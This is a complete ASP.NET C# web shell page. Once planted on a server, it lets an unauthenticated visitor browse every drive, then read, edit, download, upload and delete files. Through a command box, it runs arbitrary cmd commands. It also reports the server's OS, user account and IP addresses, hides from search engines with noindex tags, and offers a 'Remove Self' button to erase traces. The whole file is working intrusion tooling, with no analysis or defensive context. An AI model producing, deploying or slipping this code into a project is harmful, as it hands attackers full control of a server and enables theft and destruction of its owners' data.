<!--
!-->
<%@ Page language="c#" ValidateRequest="false"  %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace= "System.Drawing" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.SessionState" %>
<%@ Import Namespace="System.Web.UI" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Web.UI.HtmlControls" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices"%>
<script  runat="server">
    [DllImport("kernel32.dll", EntryPoint = "GetDriveTypeA")]

    public static extern int GetDriveType(string nDrive);
    string[] drive;
    public static string folderToBrowse;
    public void GetData(string Folder)
    {
        DirectoryInfo DirInfo = new DirectoryInfo(Folder);
        DataTable fileSystemFolderTable = new DataTable();
        DataTable fileSystemFileTable = new DataTable();
        DataTable fileSystemCombinedTable = new DataTable();
        DataColumn dcFileType = new DataColumn("Type");
        DataColumn dcFileFullName = new DataColumn("FullName");
        DataColumn dcFileName = new DataColumn("Name");
        DataColumn dcFileSize = new DataColumn("Size");
        DataColumn dcFileEdit = new DataColumn("Edit");
        DataColumn dcFileDownload = new DataColumn("Download");
        DataColumn dcFileDelete = new DataColumn("Delete");
        DataColumn dcFolderType = new DataColumn("Type");
        DataColumn dcFolderFullName = new DataColumn("FullName");
        DataColumn dcFolderName = new DataColumn("Name");
        DataColumn dcFolderSize = new DataColumn("Size");
        DataColumn dcFolderEdit = new DataColumn("Edit");
        DataColumn dcFolderDownload = new DataColumn("Download");
        DataColumn dcFolderDelete = new DataColumn("Delete");
        fileSystemFolderTable.Columns.Add(dcFileType);
        fileSystemFolderTable.Columns.Add(dcFileName);
        fileSystemFolderTable.Columns.Add(dcFileFullName);
        fileSystemFolderTable.Columns.Add(dcFileSize);
        fileSystemFolderTable.Columns.Add(dcFileEdit);
        fileSystemFolderTable.Columns.Add(dcFileDownload);
        fileSystemFolderTable.Columns.Add(dcFileDelete);
        fileSystemFileTable.Columns.Add(dcFolderType);
        fileSystemFileTable.Columns.Add(dcFolderName);
        fileSystemFileTable.Columns.Add(dcFolderFullName);
        fileSystemFileTable.Columns.Add(dcFolderSize);
        fileSystemFileTable.Columns.Add(dcFolderEdit);
        fileSystemFileTable.Columns.Add(dcFolderDownload);
        fileSystemFileTable.Columns.Add(dcFolderDelete);
        foreach (DirectoryInfo di in DirInfo.GetDirectories())
        {
            DataRow fileSystemRow = fileSystemFolderTable.NewRow();
            fileSystemRow["Type"] = "<font size=4 face=wingdings color=Gray >0</font>";
            fileSystemRow["Name"] = di.Name;
            fileSystemRow["FullName"] = di.FullName;
            fileSystemRow["Size"] = "..";
            fileSystemRow["Edit"] = "..";
            fileSystemRow["Download"] = "..";
            fileSystemRow["Delete"] = "..";
            fileSystemFolderTable.Rows.Add(fileSystemRow);
        }

        foreach (FileInfo fi in DirInfo.GetFiles())
        {
            DataRow fileSystemRow = fileSystemFileTable.NewRow();
            fileSystemRow["Type"] = "<font size=4 face=wingdings color=Gray >2</font>";
            fileSystemRow["Name"] = fi.Name;
            fileSystemRow["FullName"] = fi.FullName;
            fileSystemRow["Size"] = "[" + fi.Length + "]bytes";
            fileSystemRow["Edit"] = "<font size=4 align=center color=WhiteSmoke face=wingdings>?</font>";
            fileSystemRow["Download"] = "<font size=4 align=center algin=cenetre face=wingdings color=WhiteSmoke ><</font>";
            fileSystemRow["Delete"] = "<font color=WhiteSmoke  face=webdings size=4>r</font>";
            fileSystemFileTable.Rows.Add(fileSystemRow);
        }
        fileSystemCombinedTable = fileSystemFolderTable.Copy();
        foreach (DataRow drw in fileSystemFileTable.Rows)
        {
            fileSystemCombinedTable.ImportRow(drw);
        }
        FileSystem.DataSource = fileSystemCombinedTable;
        FileSystem.DataBind();
    
    }
    
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            try
            {
                folderToBrowse = Request.QueryString["d"] == null ? Server.MapPath("./") : Request.QueryString["d"];
                OperatingSystem os = Environment.OSVersion;
                  switch (os.Version.Major)
                  {
                      case 3:
                          system0.Text = Environment.OSVersion.ToString() + "(Windows NT 3.51)";
                          break;
                      case 4:
                          system0.Text = Environment.OSVersion.ToString() + "(Windows NT 4.0)";
                          break;
                      case 5:
                          if (os.Version.Minor == 0)
                              system0.Text = Environment.OSVersion.ToString() + " (Windows Server 2000)";
                          else if(os.Version.Minor==1)
                              system0.Text = Environment.OSVersion.ToString() + " (Windows XP)";
                          else
                              system0.Text = Environment.OSVersion.ToString() + " (Windows Server 2003)";
                              
                          break;
                  }
                log0.Text = Environment.UserName.ToString();
                uIP0.Text = Request.ServerVariables["REMOTE_ADDR"].ToString();
                txtPath.Text = folderToBrowse;
                ServIP.Text = Request.ServerVariables["LOCAL_ADDR"].ToString();
                txtPath.Text = folderToBrowse;
                GetData(folderToBrowse);
                drive = Directory.GetLogicalDrives();
                Drivers.Items.Clear();
                for (int i = 0; i < drive.Length; i++)
                {

                    if (GetDriveType(drive[i]) == 3)
                    {
                        Drivers.Items.Add(drive[i]);
                    }
                }

            }
            catch (Exception ee) { lblInfox.Text= ee.Message ; }

        }
    }
    public  static string filepath="";
   public static string type="";
    protected void FileSystem_ItemCommand(object source, DataGridCommandEventArgs e)
    {
        filepath = e.CommandArgument.ToString();

        string Folder = "<font size=4 face=wingdings color=Gray >0</font>";
            
        string fileSystemType = FileSystem.Items[e.Item.ItemIndex].Cells[0].Text;
        
       try
            {
        if (fileSystemType == Folder)
        {
            Response.Redirect(Request.ServerVariables["SCRIPT_NAME"] + "?d=" + e.CommandArgument.ToString());
        }
        else
        {
          switch(e.CommandName)
          {
              case "<font size=4 align=center algin=cenetre face=wingdings color=WhiteSmoke ><</font>":
              string filename = e.CommandName;
            Stream s = File.OpenRead(filepath);
            Byte[] buffer = new Byte[s.Length];
            try
            {
                s.Read(buffer, 0, (Int32)s.Length);
            }
            finally { s.Close(); }
            Response.ClearHeaders();
            Response.ClearContent();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=" + filename);
            Response.BinaryWrite(buffer);
            Response.End();
                  break;
              case "<font size=4 align=center color=WhiteSmoke face=wingdings>?</font>":
                  FileSystem.Visible = false;
            txtDis.Visible = true;
            btnSave.Visible = true;
            StreamReader sr = new StreamReader(filepath);
            txtDis.Text = sr.ReadToEnd();
            break;
              case "<font color=WhiteSmoke  face=webdings size=4>r</font>":
            FileInfo fDelete = new FileInfo(filepath);
            fDelete.Delete();
            lblInfox.Text = "File :"+Path.GetFileName(filepath)+" Deleted Successfly";
            GetData(txtPath.Text);
            break;
              default :
            txtDis.ReadOnly = true;
            txtDis.Visible = true;
                           
            StreamReader sr1 = new StreamReader(filepath);
            txtDis.Text = sr1.ReadToEnd();

            break;
        }
                       
        }
       
            }

            catch (Exception ee) { lblInfox.Text= ee.Message; }
        }
    protected void ADD_Click(object sender, EventArgs e)
    {
        System.Diagnostics.ProcessStartInfo sinf = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + this.txt.Text + "");
        sinf.RedirectStandardOutput = true;
        sinf.UseShellExecute = false;
        sinf.CreateNoWindow = true;
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo = sinf;
        p.Start();
        string res = p.StandardOutput.ReadToEnd();
        this.txtDis.Text = Server.HtmlEncode(res);
        this.txtDis.DataBind();
    }


    protected void btnUpload_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
        DirectoryInfo Dir = new DirectoryInfo(txtPath.Text);
        
        if (File1.PostedFile.FileName == "")
        { 
        lblInfox.Text="No File specified";
        }else
        {
            string filename = Path.GetFileName(File1.PostedFile.FileName);
            string fullpath = Path.Combine(Dir.FullName, filename);
            try
            {
                File1.PostedFile.SaveAs(fullpath);
                lblInfox.Text = "File :" + filename + " Uploaded Successfly";
                GetData(folderToBrowse);
            
            }
            catch (Exception ex) { lblInfox.Text = ex.Message; }
        
        
        }
    }
    protected void btnSave_Click(object sender, EventArgs e)
    {
        try
        {
            lblInfox.Text = "";
            StreamWriter sw = new StreamWriter(filepath);
            sw.Write(txtDis.Text);
            sw.Close();
            lblInfox.Text = "File Saved Successfly";
            
        }
        catch (Exception ex) { lblInfox.Text = ex.Message; }

    }
    protected void Drivers_SelectedIndexChanged(object sender, EventArgs e)
    {  
    }

    protected void btnView_Click(object sender, EventArgs e)
    {

        lblInfox.Text = "";
        Response.Redirect(Request.ServerVariables["SCRIPT_NAME"] + "?d=" + this.txtPath.Text);
        
    }

    protected void lnkExec_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
        txtDis.Text = "";
        txtDis.Visible = true;
        Button1.Visible = true;
        txt.Visible = true;
        lblCommand.Visible = true;
        FileSystem.Visible = true;
        btnSave.Visible = false;
        btnUpload.Visible = false;
        File1.Visible = false;
        lblUpload.Visible = false;
    }

    protected void lnkHome_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
Response.Redirect("http://"+Request.ServerVariables["SERVER_NAME"]+Request.ServerVariables["SCRIPT_NAME"]);
    }

    protected void lnkUpload_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
        txtDis.Visible = false;
        Button1.Visible = false;
        txt.Visible = false;
        lblCommand.Visible = false;
       
        
        btnUpload.Visible = true;
        File1.Visible = true;
        lblUpload.Visible = true;
        FileSystem.Visible = true;
    }

    protected void lnkRef_Click(object sender, EventArgs e)
    {
        lblInfox.Text = "";
        GetData(txtPath.Text);
    }

    protected void btnGo_Click(object sender, EventArgs e)
    {
        Response.Redirect(Request.ServerVariables["SCRIPT_NAME"] + "?d=" + this.Drivers.SelectedValue);
    }

    protected void lnkDel_Click(object sender, EventArgs e)
    {
        FileInfo fDelete = new FileInfo(Server.MapPath(Request.ServerVariables["SCRIPT_NAME"]));
        fDelete.Delete();
        lblInfox.Text = "File :" + Path.GetFileName(filepath) + " Deleted Successfly";
    }
</script>

<HTML>
	<HEAD>
		<title></title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="C#" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex, nofollow">
        <meta name="bingbot" content="noindex, nofollow">
	    <style type="text/css">
            #Form1
            {
                height: 929px;
                direction: ltr;
                width: 792px;
                margin-right: 0px;
            }
            .style1
            {
                width: 117%;
                height: 728px;
            }
            #Submit1
            {
                height: 21px;
                width: 77px;
            }
            *		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}
*		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;}
*		{scrollbar-base-color:#777777;
scrollbar-track-color:#777777;scrollbar-darkshadow-color:#777777;scrollbar-face-color:#505050;
scrollbar-arrow-color:#ff8300;scrollbar-shadow-color:#303030;scrollbar-highlight-color:#303030;
                margin-left: 0px;
                margin-top: 6px;
            }
            .style11
            {
                text-align: center;
                height: 423px;
            }
            .style13
            {
                height: 125px;
                text-align: center;
            }
            .style14
            {
                height: 119px;
                text-align: center;
            }
            .style15
            {
                width: 74%;
                border: 1px solid #75787C;
            }
            .style16
            {
                height: 43px;
                width: 687px;
            }
            .style17
            {
                text-align: center;
                height: 26px;
            }
            .style20
            {
                text-align: center;
            }
            .style22
            {
                height: 20px;
                text-align: center;
            }
            .style23
            {
                height: 36px;
                text-align: center;
            }
            .style24
            {
                height: 426px;
            }
            </style>
	

</script>
</HEAD>
	<body bgcolor="Black">
		<form id="Form1" method="post" enctype="multipart/form-data" runat="server"  >
			
         
			
        <br />
			
         
			
        <table class="style1">
                <tr>
                    <td style="color: #00FF00; direction: ltr;" class="style13">
        <table class="style15">
            <tr>
                <td bgcolor="#666666" align="center">
                    -----------<font color="Black"  face="webdings" size="6" >N</font>--------------[]-----------<font color="Black"  face="webdings" size="6" >N</font>------------</td>
            </tr>
            <tr>
                <td bgcolor="#303030">
                        <asp:Label ID="system" runat="server" Text="System :" ForeColor="#FF8300" BorderColor="White"></asp:Label>
                        &nbsp; <asp:Label ID="system0" runat="server" ForeColor="White"></asp:Label>
                        </td>
            </tr>
            <tr>
                <td bgcolor="#303030">
                        <asp:Label ID="log" runat="server" Text="User Log :" ForeColor="#FF8300"></asp:Label>
            &nbsp; <asp:Label ID="log0" runat="server" ForeColor="White"></asp:Label>
                    </td>
            </tr>
            <tr>
                <td bgcolor="#303030">
                        <asp:Label ID="uIP1" runat="server" Text="Server IP :" ForeColor="#FF8300"></asp:Label>
                        &nbsp;
                        <asp:Label ID="ServIP" runat="server" ForeColor="White"></asp:Label>
                        </td>
            </tr>
            <tr>
                <td bgcolor="#303030">
                        <asp:Label ID="uIP" runat="server" Text="Your IP :" ForeColor="#FF8300"></asp:Label>
                        &nbsp;&nbsp;&nbsp; <asp:Label ID="uIP0" runat="server" ForeColor="White"></asp:Label>
                    </td>
            </tr>
            <tr>
                <td bgcolor="#666666">
                    &nbsp;</td>
            </tr>
        </table>
                    </td>
                </tr>
                <tr>
                    <td style="color: #00FF00; direction: ltr;" class="style14">
			
         
			
<Table class="style15" ><tr><td bgcolor=#505050 >
<font face=Arial size=2 color=#ff8300 > PATH INFO : </font></td></tr>
<tr><td cellpadding=2 bgcolor=#303030 ><font face=Arial size=-1 color=gray>Virtual: http://<%=Request.ServerVariables["SERVER_NAME"]%><%=Request.ServerVariables["SCRIPT_NAME"]%></Font><BR><font face=wingdings color=Gray >1<br />
    </font>
&nbsp;<font face=Arial size=+1 color=White ><%=folderToBrowse%></font><BR>&nbsp;<asp:TextBox 
        ID="txtPath" runat="server" BorderStyle="None" Width="542px"></asp:TextBox>
&nbsp;&nbsp;&nbsp;&nbsp;<font face="Arial" size="2" color="#ff8300" ><asp:Button ID="btnView" 
        runat="server" BorderStyle="None" Height="24px" 
                            Text="view" Width="69px" onclick="btnView_Click" />
                        </font>
                        &nbsp;&nbsp;&nbsp;&nbsp;</td></tr></table>
                    </td>
                </tr>
                <tr>
                    <td style="color: #00FF00; direction: ltr;" class="style23">
                        <table class="style15">
                            <tr>
                                <td bgcolor="#666666" class="style22" align="center">
                                    &nbsp;<span class="style5"><asp:Label ID="lblUpload0" runat="server"  
                            Text="Drivers :  " ForeColor="#FF8300" Font-Size="Medium"></asp:Label>
                                    </span>
                                    <asp:DropDownList ID="Drivers" runat="server" BackColor="#666666" 
                                        ForeColor="White" Height="16px" Width="130px">
                                    </asp:DropDownList>
&nbsp;
<asp:Button Text="[Go]" OnClick="btnGo_Click" Runat="server" ID="btnGo" BackColor="#666666" 
                            BorderColor="White" BorderStyle="Groove" ForeColor="White" 
                                        Height="21px" Width="83px"></asp:Button>
                                </td>
                            </tr>
                        </table>
                    </td>
                </tr>
                <tr>
                    <td style="color: #00FF00; direction: ltr;" class="style20">
                        <table class="style15">
                            <tr>
                                <td bgcolor="#666666">
                                    <asp:LinkButton ID="lnkHome" runat="server" onclick="lnkHome_Click">[Home]</asp:LinkButton>
                                    &nbsp;&nbsp;&nbsp;<asp:LinkButton ID="lnkRef" runat="server" onclick="lnkRef_Click">[Refresh]</asp:LinkButton>
                                    &nbsp;&nbsp;
                                    <asp:LinkButton ID="lnkExec" runat="server" onclick="lnkExec_Click">[Execute 
                                    Command]</asp:LinkButton>
                                    &nbsp;&nbsp;
                                    <asp:LinkButton ID="lnkUpload" runat="server" onclick="lnkUpload_Click">[Upload]</asp:LinkButton>
                                    &nbsp;&nbsp;
                                    <asp:LinkButton ID="lnkDel" runat="server" onclick="lnkDel_Click">[Remove Self]</asp:LinkButton>
                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
                            </tr>
                        </table>
                    </td>
                </tr>
                <tr>
                    <td class="style11">
                        <table class="style15">
                            <tr>
                                <td bgcolor="#303030" class="style24">
                                    &nbsp;<font color="#00FF00" style="text-align: center"><asp:Label ID="lblCommand" runat="server"  
                            Text="Command :" ForeColor="#FF8300" Visible="False"></asp:Label>
                        &nbsp;<asp:TextBox ID="txt" Runat="server" Width="281px" Visible="False"></asp:TextBox>
                        </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<asp:Button Text="Execute" OnClick="ADD_Click" Runat="server" ID="Button1" BackColor="#666666" 
                            BorderColor="White" BorderStyle="Groove" ForeColor="White" Visible="False"></asp:Button>
                                    <span class="style5">
                        <asp:Label ID="lblUpload" runat="server"  
                            Text="File Upload :" ForeColor="#FF8300" Visible="False"></asp:Label>
                                    &nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;
                      
                    <input type="file" id="File1" name="File1" runat="server" visible="False" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button ID="btnUpload" type="submit" runat="server" Height="24px" 
                            onclick="btnUpload_Click" Text="Upload" Width="79px" Visible="False" />

                                    <br />

                                    <asp:Label ID="lblInfox" runat="server" Font-Size="Medium" ForeColor="#FF8300"></asp:Label>
                                    <asp:Button ID="btnSave" runat="server" BackColor="#505050" BorderColor="White" 
                            BorderStyle="Ridge" ForeColor="White" onclick="btnSave_Click" Text="[Save]" 
                            Width="674px" Visible="False" />
                                    <br />
                        <asp:TextBox ID="txtDis" runat="server" BackColor="#666666" ForeColor="White" 
                            Height="217px" TextMode="MultiLine" Visible="False" Width="675px" ></asp:TextBox>
                        <asp:datagrid id="FileSystem" runat="server" AllowSorting="True" 
                Font-Names="Arial" Font-Size="XX-Small"
				AutoGenerateColumns="False" onitemcommand="FileSystem_ItemCommand" 
                ForeColor="White" Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                            Font-Strikeout="False" Font-Underline="False" Height="111px" Width="674px">
				            <PagerStyle Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                                Font-Strikeout="False" Font-Underline="False" ForeColor="White" />
				<Columns>
					<asp:BoundColumn DataField="Type" HeaderText=" [Type] " 
                        HeaderStyle-Font-Size="10" HeaderStyle-ForeColor="White" 
                        HeaderStyle-BackColor="#505050">
                     <HeaderStyle Width="80px"></HeaderStyle>
					</asp:BoundColumn>
					<asp:TemplateColumn HeaderText=" [Name] " HeaderStyle-Font-Size="10" 
                        HeaderStyle-ForeColor="White">
						<HeaderStyle Width="350px"></HeaderStyle>
						<ItemTemplate>
							<asp:LinkButton id="systemLink" ForeColor="WhiteSmoke" runat="server" CommandArgument='<%# DataBinder.Eval(Container, "DataItem.FullName") %>' CommandName='<%# DataBinder.Eval(Container, "DataItem.Name") %>'>
								<%# DataBinder.Eval(Container, "DataItem.Name") %>
							</asp:LinkButton>
						</ItemTemplate>
					</asp:TemplateColumn>
				    <asp:BoundColumn DataField="Size" HeaderText="[Size]"></asp:BoundColumn>
				    <asp:TemplateColumn HeaderText=" [Edit] " HeaderStyle-Font-Size="10">
				    <ItemTemplate>
                            <asp:LinkButton ID="systemEdit" runat="server" 
                                CommandArgument='<%# DataBinder.Eval(Container, "DataItem.FullName") %>' 
                                CommandName='<%# DataBinder.Eval(Container, "DataItem.Edit") %>' 
                                ForeColor="WhiteSmoke">
                            <!--	<%# type = "<font size=4 face=wingdings color=Gray >4</font>"%> !-->
                            <%# DataBinder.Eval(Container,"DataItem.Edit") %>
                            </asp:LinkButton>
                        </ItemTemplate>

<HeaderStyle Font-Size="10pt"></HeaderStyle>
				        <ItemStyle Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                            Font-Strikeout="False" Font-Underline="False" HorizontalAlign="Center" />
				    </asp:TemplateColumn>
				    <asp:TemplateColumn HeaderText=" [Download] " HeaderStyle-Font-Size="10">
				    <ItemTemplate>
                            <asp:LinkButton ID="systemDownload" runat="server" 
                                CommandArgument='<%# DataBinder.Eval(Container, "DataItem.FullName") %>' 
                                CommandName='<%# DataBinder.Eval(Container, "DataItem.Download") %>' 
                                ForeColor="WhiteSmoke">
                          <%# DataBinder.Eval(Container, "DataItem.Download") %>
                                                      </asp:LinkButton>
                        </ItemTemplate>

<HeaderStyle Font-Size="10pt"></HeaderStyle>
				        <ItemStyle Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                            Font-Strikeout="False" Font-Underline="False" HorizontalAlign="Center" />
				    </asp:TemplateColumn>
                    <asp:TemplateColumn HeaderText="[Delete]" HeaderStyle-Font-Size="10">
                        <ItemTemplate>
                            <asp:LinkButton ID="systemDelete" runat="server" 
                                CommandArgument='<%# DataBinder.Eval(Container, "DataItem.FullName") %>' 
                                CommandName='<%# DataBinder.Eval(Container, "DataItem.Delete") %>' 
                                ForeColor="WhiteSmoke">
                   <%# DataBinder.Eval(Container, "DataItem.Delete") %>
                  
                            </asp:LinkButton>
                        </ItemTemplate>

<HeaderStyle Font-Size="10pt"></HeaderStyle>
                        <ItemStyle Font-Bold="False" Font-Italic="False" Font-Overline="False" 
                            Font-Strikeout="False" Font-Underline="False" HorizontalAlign="Center" />
                    </asp:TemplateColumn>
				</Columns>
			                <HeaderStyle BackColor="#505050" Font-Bold="False" Font-Italic="False" 
                                Font-Overline="False" Font-Strikeout="False" Font-Underline="False" 
                                ForeColor="White" />
			</asp:datagrid>
                                    </font></td>
                            </tr>
                        </table>
                    </td>
                </tr>
                
                <tr>
                    <td class="style17">
                        <table class="style15">
                            <tr>
                                <td bgcolor="#666666" class="style16" align="center">
                                    ]----------- heyya -------------------[</a>
                                    <br />
&nbsp;]-------------------------[kaz</a>]-------------------------[ </td>
                            </tr>
                        </table>
                    </td>
                </tr>
               
                
            </table>


        </form>
	</body>
</HTML>

